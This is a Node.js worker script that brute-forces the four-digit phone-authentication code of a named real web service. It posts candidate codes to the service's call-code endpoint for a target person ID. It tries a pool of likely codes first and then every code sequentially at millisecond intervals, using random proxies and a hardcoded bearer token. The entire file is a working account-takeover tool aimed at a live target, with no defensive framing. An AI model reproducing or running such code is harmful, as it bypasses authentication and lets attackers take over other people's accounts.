const { parentPort, workerData } = require('worker_threads');
const axios = require('axios');
const { PROXIES, CODE_POOL, BRUTE_TYPE } = require('../configs');
var padStart = require('lodash/padStart')
const async = require('async');
const instance = axios.create({
    baseURL: 'https://api.za.gorodsreda.ru/v1',
    timeout: 5000,
    headers: {
        "accept": "application/json, text/plain, *\/*",
        "accept-language": "ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,ru-RU;q=0.6,en-US;q=0.5,en;q=0.4",
        "authorization": "Bearer NJ4cWN7hLGujEjfbtkoKNjipjORTsrFE_1619614767",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
});

if(PROXIES.length >= 1) {
    let random_proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
    instance.defaults.proxy = random_proxy;
}

const { personUid } = workerData;

console.log(workerData)

function clock(start) {
    if ( !start ) return process.hrtime();
    var end = process.hrtime(start);
    return Math.round((end[0]*1000) + (end[1]/1000000));
}

if(personUid) {
  var count = 0;
  var start = clock();


if(BRUTE_TYPE == "POOL") {
    async.map(CODE_POOL, async (item, callback) => {
        let code = padStart(item, 4, '0');
        await instance.post('/phone-auth/call-code', {personUid, code})
        .then(res => {
            var taken_time = clock(start);
            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
        })
        .catch(err => {
            // if (code % 100 == 0) {
                //   console.log()
                //   console.log(`Code: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
            // }
        })
    }).then(res => {
        parentPort.postMessage({success: false, error: "Not found!"})
    })
} else if(BRUTE_TYPE == "BRUTE") {
    setInterval(async () => {
        count++
        let code = padStart(count, 4, '0');
        await instance.post('/phone-auth/call-code', {personUid, code})
        .then(res => {
            var taken_time = clock(start);
  
            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
        })
        .catch(err => {
            if (code % 500 == 0) {
                  console.log()
                  console.log(`Iters: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
              }
        })
        if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired"})
      }, 3)    
} else if(BRUTE_TYPE == "COMBINED") {
    async.map(CODE_POOL, async (item, callback) => {
        let code = padStart(item, 4, '0');
        await instance.post('/phone-auth/call-code', {personUid, code})
        .then(res => {
            var taken_time = clock(start);
            parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
        })
        .catch(err => {
            // if (code % 100 == 0) {
                //   console.log()
                //   console.log(`Code: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
            // }
        })
    }).then(res => {
        console.log(`[INFO] Code in pool not found. Starting brute.`)
        setInterval(async () => {
            count++
            let code = padStart(count, 4, '0');
            await instance.post('/phone-auth/call-code', {personUid, code})
            .then(res => {
                var taken_time = clock(start);
      
                parentPort.postMessage({success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
            })
            .catch(err => {
                if (code % 500 == 0) {
                      console.log()
                      console.log(`Iters: ${code}, \nresponse: ${JSON.stringify(err?.response?.data)}`)
                  }
            })
            if(count >= 10001) parentPort.postMessage({success: false, error: "Code expired"})
          }, 3)  
    })
}

}
